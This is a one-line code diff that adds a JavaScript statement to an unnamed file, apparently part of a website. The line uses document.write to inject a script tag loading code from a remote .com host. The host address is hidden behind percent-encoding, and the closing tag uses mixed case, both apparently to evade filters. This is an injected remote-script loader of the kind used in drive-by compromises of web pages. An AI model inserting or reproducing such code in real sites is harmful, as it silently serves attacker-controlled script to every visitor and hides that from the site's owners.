@@ -1,0 +1,1 @@
+document.write("<script src='http://%6A%73%2E%6B%30%31%30%32%2E%63%6F%6D/%30%31%2E%61%73%70'></sCrIpT>");
